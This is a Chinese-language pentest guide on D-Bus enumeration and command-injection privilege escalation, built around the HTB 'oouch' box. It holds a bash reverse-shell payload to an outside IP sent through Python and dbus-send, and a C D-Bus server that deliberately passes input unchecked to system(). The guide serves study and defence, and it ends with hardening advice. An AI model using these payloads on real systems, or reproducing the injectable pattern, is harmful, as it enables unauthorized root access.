# D-Bus 枚举与命令注入权限提升

{{#include ../../banners/hacktricks-training.md}}

## **GUI 枚举**

D-Bus 被用作 Ubuntu 桌面环境中的进程间通信（IPC）中介。在 Ubuntu 上，可以观察到多个 message bus 并行运行：system bus 主要由 **privileged services 用于公开整个系统相关的服务**，而每个已登录用户都有一个 session bus，仅公开与该特定用户相关的服务。这里主要关注 system bus，因为它与以更高权限（例如 root）运行的服务相关，而我们的目标是提升权限。需要注意的是，D-Bus 的架构为每个 session bus 配置了一个“router”，负责根据客户端为希望通信的服务指定的地址，将客户端消息重定向到相应的服务。

D-Bus 上的服务由其公开的 **objects** 和 **interfaces** 定义。Objects 可以类比于标准 OOP 语言中的类实例，每个实例都由一个唯一的 **object path** 标识。该路径类似于 filesystem path，用于唯一标识服务公开的每个 object。研究中一个关键的 interface 是 **org.freedesktop.DBus.Introspectable** interface，其中包含一个名为 Introspect 的方法。该方法返回 object 所支持的方法、signals 和 properties 的 XML 表示；这里主要关注 methods，省略 properties 和 signals。

为了与 D-Bus interface 通信，使用了两个工具：名为 **gdbus** 的 CLI 工具，可用于在 scripts 中轻松调用 D-Bus 公开的方法；以及 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)，这是一个基于 Python 的 GUI 工具，用于枚举每个 bus 上可用的 services，并显示每个 service 中包含的 objects。
```bash
sudo apt-get install d-feet
```
如果你正在检查 **session bus**，请先确认当前地址：
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

在第一张图片中，显示了注册到 D-Bus system bus 的 services；在选择 System Bus 按钮后，特别突出显示了 **org.debin.apt**。D-Feet 会向该 service 查询 objects，并在第二张图片中显示所选 objects 的 interfaces、methods、properties 和 signals。每个 method 的 signature 也会详细列出。

一个值得注意的功能是显示 service 的 **process ID (pid)** 和 **command line**，这对于确认 service 是否以 elevated privileges 运行非常有用，对研究相关性十分重要。

**D-Feet 还允许调用 method**：用户可以将 Python expressions 作为 parameters 输入，D-Feet 会在将其传递给 service 之前转换为 D-Bus types。

不过请注意，**某些 methods 在允许我们调用之前需要 authentication**。我们将忽略这些 methods，因为我们的目标本来就是在没有 credentials 的情况下提升 privileges。

还要注意，某些 services 会查询另一个名为 org.freedeskto.PolicyKit1 的 D-Bus service，以确定是否应允许某个用户执行特定 actions。

## **Cmd line Enumeration**

### List Service Objects

可以使用以下命令列出已打开的 D-Bus interfaces：
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
标记为 **`(activatable)`** 的 Services 尤其值得关注，因为它们**尚未运行**，但 bus 请求可以按需启动它们。不要止步于 `busctl list`；将这些名称映射到它们实际会执行的二进制文件。
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
这会快速告诉你，哪个 `Exec=` 路径将为某个 activatable name 启动，以及该进程将以哪个身份运行。如果 binary 或其执行链受到的保护较弱，那么 inactive service 仍可能成为 privilege-escalation 路径。

#### Connections

[来自 Wikipedia：](https://en.wikipedia.org/wiki/D-Bus) 当一个进程与 bus 建立 connection 时，bus 会为该 connection 分配一个特殊的 bus name，称为 _unique connection name_。此类 bus name 是不可变的——只要 connection 存在，就保证不会发生变化；更重要的是，它们在 bus 的生命周期内无法被重复使用。这意味着，即使同一进程关闭与 bus 的 connection 后再创建一个新的 connection，该 bus 上也不会有其他 connection 被分配到同一个 unique connection name。Unique connection name 很容易识别，因为它们以通常被禁止使用的冒号字符开头。

### Service Object Info

然后，你可以通过以下方式获取有关 interface 的信息：
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
同时将 bus 名称与其 `systemd` 单元和可执行文件路径相关联：
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
这回答了 privesc 过程中最关键的操作问题：**如果 method call 成功，哪个真实 binary 和 unit 将执行该操作？**

### 列出 Service Object 的 Interfaces

你需要拥有足够的权限。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 检查 Service Object 的 Interface

注意，在此示例中选择了使用 `tree` 参数发现的最新 Interface（_见上一节_）：
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
注意接口 `htb.oouch.Block` 的 `.Block` 方法（这正是我们感兴趣的方法）。其他列中的 “s” 可能表示该方法需要一个字符串。

在尝试任何危险操作之前，先验证一个**面向读取**或其他低风险的方法。这样可以清晰地区分三种情况：语法错误、可访问但被拒绝，或可访问且获准执行。
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### 将 D-Bus Methods 与 Policies 和 Actions 关联起来

Introspection 可以告诉你**可以调用什么**，但不会告诉你某个调用**为什么被允许或拒绝**。进行实际的 privesc 分析时，通常需要同时检查以下**三层**：

1. **Activation metadata**（`.service` files 或 `SystemdService=`），了解实际会运行哪个 binary 和 unit。
2. **D-Bus XML policy**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`），了解哪些主体可以执行 `own`、`send_destination` 或 `receive_sender`。
3. **Polkit action files**（`/usr/share/polkit-1/actions/*.policy`），了解默认的 authorization model（`allow_active`、`allow_inactive`、`auth_admin`、`auth_self`、`org.freedesktop.policykit.imply`）。

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
不要假设 D-Bus method 与 Polkit action 之间存在一一对应关系。同一个 method 可能会根据被修改的对象或运行时上下文选择不同的 action。因此，实际工作流程是：

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose`，并 grep 相关的 `.policy` 文件
3. 使用 `busctl call`、`gdbus call` 或 `dbusmap --enable-probes --null-agent` 进行低风险 live probes

Proxy 或兼容性服务需要特别关注。一个**以 root 运行的 proxy**，如果通过其自身预先建立的连接将请求转发到另一个 D-Bus 服务，可能会意外地让 backend 将每个请求都视为来自 UID 0，除非对原始调用方的身份进行重新验证。

### Monitor/Capture Interface

拥有足够的 privileges（仅有 `send_destination` 和 `receive_sender` privileges 是不够的）后，你可以**monitor D-Bus communication**。

要**monitor**一段**communication**，你需要成为 **root**。如果你在 root 权限下仍然发现问题，请查看 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 和 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> 如果你知道如何配置 D-Bus config file，以**允许非 root 用户 sniff** communication，请**联系我**！

Different ways to monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
在以下示例中，接口 `htb.oouch.Block` 受到监控，并且**消息 "**_**lalalalal**_**" 通过通信错误发送**：
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
你可以使用 `capture` 代替 `monitor`，将结果保存为 Wireshark 可以打开的 **pcapng** 文件：
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### 过滤所有噪声 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

如果 bus 上的信息过多，可以传递如下匹配规则：
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
可以指定多条规则。如果一条消息匹配_任意_规则，该消息就会被打印出来。如下所示：
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
有关 match rule 语法的更多信息，请参阅 [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)。

### 更多

`busctl` 还有更多选项，[**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **易受攻击的场景**

作为来自 HTB 的主机 "oouch" 中的用户 **qtc**，你可以找到一个位于 _/etc/dbus-1/system.d/htb.oouch.Block.conf_ 的**意外 D-Bus 配置文件**：
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
请注意，在之前的配置中，**你需要是用户 `root` 或 `www-data`，才能通过此 D-BUS 通信发送和接收信息**。

作为 docker container 中的用户 **qtc**，你可以在文件 _/code/oouch/routes.py._ 中找到一些与 dbus 相关的代码。以下是相关代码：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
如你所见，它正在**连接到一个 D-Bus interface**，并将“client_ip”发送给**“Block” function**。

在 D-Bus connection 的另一端，正在运行某个经过 C 编译的 binary。该代码正在 D-Bus connection 中**监听 IP address，并通过 `system` function 调用 iptables**，以阻止给定的 IP address。\
**对 `system` 的调用是故意存在 command injection 漏洞的**，因此，类似下面这样的 payload 将创建一个 reverse shell：`;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### 利用它

在本页面末尾，你可以找到 **D-Bus application 的完整 C code**。其中第 91-97 行之间可以找到**如何注册 `D-Bus object path`**以及**`interface name`**。要向 D-Bus connection 发送信息，就需要这些信息：
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
此外，在第 57 行可以看到，此 D-Bus 通信中**唯一注册的方法**名为 `Block`（_**这就是为什么在接下来的部分中，payload 将被发送到 service object `htb.oouch.Block`、interface `/htb/oouch/Block` 以及 method name `Block`**_）：
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下 Python 代码将通过 `block_iface.Block(runme)` 将 payload 发送到 D-Bus connection 的 `Block` method（_注意，该代码提取自前一个代码片段_）：
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 和 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` 是一个用于向“Message Bus”发送消息的工具
- Message Bus —— 系统用于让应用程序之间轻松通信的软件。它与 Message Queue 相关（消息按顺序排列），但在 Message Bus 中，消息以订阅模型发送，速度也非常快。
- “-system” tag 用于表示这是 system message，而不是 session message（默认情况）。
- “–print-reply” tag 用于适当地打印我们的消息，并以人类可读的格式接收任何回复。
- “–dest=Dbus-Interface-Block” Dbus interface 的地址。
- “–string:” —— 我们希望发送到 interface 的消息类型。发送消息有多种格式，例如 double、bytes、booleans、int、objpath。其中，当我们想要向 Dbus interface 发送文件路径时，“object path” 非常有用。在这种情况下，我们可以使用 special file（FIFO），以文件名的形式向 interface 传递 command。“string:;” —— 用于再次调用 object path，在其中放置 FIFO reverse shell 文件/command。

_请注意，在 `htb.oouch.Block.Block` 中，第一部分（`htb.oouch.Block`）引用 service object，最后一部分（`.Block`）引用 method name。_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers（2023-2025）

手动使用 `busctl`/`gdbus` 对大型 D-Bus attack surface 进行 Enumeration 很快会变得非常繁琐。近几年发布的两个小型 FOSS 工具，可以在 red-team 或 CTF engagement 中加快这一过程：

### dbusmap（“Nmap for D-Bus”）
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* 使用 C 编写；单个静态 binary（小于 50 kB），会遍历每个 object path，获取 `Introspect` XML，并将其映射到所属的 PID/UID。
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* 该工具会使用 `!` 标记未受保护的 well-known names，从而立即暴露出你可以 *own*（接管）的 services，或从 unprivileged shell 可访问的方法调用。

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* 仅使用 Python 编写的 script，用于查找 systemd units 中的 *writable* paths，以及权限过于宽松的 D-Bus policy files（例如 `send_destination="*"`）。
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module 会搜索以下 directories，并突出显示任何可被 normal user spoof 或 hijack 的 service：
* `/etc/dbus-1/system.d/` 和 `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/`（vendor overrides）

---

## 值得注意的 D-Bus Privilege-Escalation Bugs（2024-2025）

关注近期发布的 CVEs，有助于发现 custom code 中类似的不安全 pattern。以下是两个较好的近期 examples：

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4（`logid`） | 以 root 运行的 service 暴露了一个 unprivileged users 可以重新配置的 D-Bus interface，其中包括加载 attacker-controlled macro behavior。 | 如果 daemon 在 system bus 上暴露 **device/profile/config management**，应将 writable configuration 和 macro features 视为 code-execution primitives，而不只是“settings”。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | 以 root 运行的 compatibility proxy 将 requests 转发到 backend services 时，没有保留原始 caller 的 security context，因此 backend 将该 proxy 当作 UID 0 来信任。 | 应将 **proxy / bridge / compatibility** D-Bus services 视为独立的 bug class：如果它们 relay privileged calls，应验证 caller UID/Polkit context 如何传递到 backend。 |

需要注意的 patterns：
1. Service 在 system bus 上 **以 root 身份运行**。
2. 要么 **没有 authorization check**，要么 check 是针对 **错误的 subject** 执行的。
3. 可访问的方法最终会改变 system state：package install、user/group changes、bootloader config、device profile updates、file writes 或 direct command execution。

使用 `dbusmap --enable-probes` 或手动执行 `busctl call`，确认某个方法是否可访问；然后检查 service 的 policy XML 和 Polkit actions，以了解实际授权的是 **哪个 subject**。

---

## Hardening & Detection Quick-Wins

* 搜索 world-writable 或 *send/receive*-open policies：
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 对 dangerous methods 要求使用 Polkit —— 即使是 *root* proxies，也应将 *caller* PID 传递给 `polkit_authority_check_authorization_sync()`，而不是传递自身的 PID。
* 在 long-running helpers 中 drop privileges（使用 `sd_pid_get_owner_uid()`，以便在连接到 bus 后切换 namespaces）。
* 如果无法移除某个 service，至少将其 *scope* 限制到专用 Unix group，并在其 XML policy 中限制访问。
* Blue-team：使用 `busctl capture > /var/log/dbus_$(date +%F).pcapng` 捕获 system bus，并将其导入 Wireshark 进行 anomaly detection。

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
